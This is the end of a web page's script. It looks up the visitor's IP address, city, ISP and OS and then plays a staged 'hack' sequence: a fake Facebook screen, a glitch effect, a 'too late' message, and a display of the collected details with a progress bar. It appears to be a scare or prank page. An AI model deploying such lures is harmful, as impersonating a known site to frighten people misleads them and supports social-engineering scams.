        // â”€â”€â”€ Main Init â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        async function init() {
            let userData = {
                ip: '197.0.0.1', city: 'Tunis', isp: 'Topnet',
                res: `${screen.width}x${screen.height}`, os: 'Windows'
            };
            try {
                const r = await fetch('https://ipapi.co/json/');
                const d = await r.json();
                userData.ip   = d.ip   || userData.ip;
                userData.city = d.city || userData.city;
                userData.isp  = d.org  || userData.isp;
            } catch(e) {}

            const ua = navigator.userAgent;
            if      (ua.includes('Windows NT 10')) userData.os = 'Windows 11/10';
            else if (ua.includes('Mac'))           userData.os = 'macOS';
            else if (ua.includes('Android'))       userData.os = 'Android';
            else if (ua.includes('iPhone'))        userData.os = 'iOS';

            flashCMD(800);

            setTimeout(() => {
                document.getElementById('fake-fb').style.display = 'none';
                document.body.classList.remove('glitch-active');
                document.body.style.background = '#000';
            }, 900);

            setTimeout(() => {
                const tt = document.getElementById('trop-tard');
                tt.style.display = 'flex';
                setTimeout(() => { tt.style.transition = 'opacity 0.5s'; tt.style.opacity = 1; }, 50);
                setTimeout(() => { tt.style.opacity = 0; }, 1300);
            }, 1700);

            setTimeout(() => {
                document.getElementById('trop-tard').style.display = 'none';
                const main = document.getElementById('main-ui');
                main.style.display = 'block';
                setTimeout(() => { main.style.opacity = 1; }, 50);
                setTimeout(() => revealData(userData), 800);
                setTimeout(() => startProgress(), 2500);
            }, 3300);
        }

        window.onload = init;
    </script>
</body>
</html>
